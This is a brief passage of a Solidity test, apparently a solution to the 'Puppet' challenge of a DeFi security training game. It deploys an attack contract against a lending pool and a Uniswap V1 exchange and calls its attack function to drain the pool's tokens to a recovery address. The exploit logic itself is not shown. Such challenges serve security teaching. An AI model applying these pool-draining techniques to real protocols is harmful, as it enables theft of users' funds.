...
contract PuppetChallenge is Test {
    ...
    function test_puppetV1() public checkSolvedByPlayer {
        rescue rescue = new rescue{value: PLAYER_INITIAL_ETH_BALANCE}(token, lendingPool, uniswapV1Exchange, recovery);
        token.transfer(address(rescue), PLAYER_INITIAL_TOKEN_BALANCE);
        rescue.attack(POOL_INITIAL_TOKEN_BALANCE);
